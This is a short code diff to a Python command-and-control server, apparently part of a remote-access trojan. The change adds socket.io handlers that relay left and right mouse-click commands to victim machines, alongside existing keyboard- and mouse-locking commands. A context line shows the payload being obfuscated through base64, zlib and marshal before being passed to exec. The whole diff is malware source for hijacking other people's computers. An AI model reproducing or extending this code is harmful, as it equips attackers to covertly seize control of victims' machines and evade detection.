@@ -37,6 +37,9 @@ class C2:
         self.sio.on("lock_keyboard", self.lock_keyboard)
         self.sio.on("lock_mouse", self.lock_mouse)
 
+        self.sio.on("mouse_click", self.mouse_click)
+        self.sio.on("mouse_click_right", self.mouse_click_right)
+
         print(f"Current time: {datetime.datetime.utcnow()}")
 
     def get_client_ip(self, environ):
@@ -349,3 +352,10 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
     def lock_mouse(self, sid ,data):
         self.sio.emit("lock_mouse", data)
+
+
+    def mouse_click(self, sid, data):
+        self.sio.emit("mouse_click", data)
+
+    def mouse_click_right(self, sid, data):
+        self.sio.emit("mouse_click_right", data)
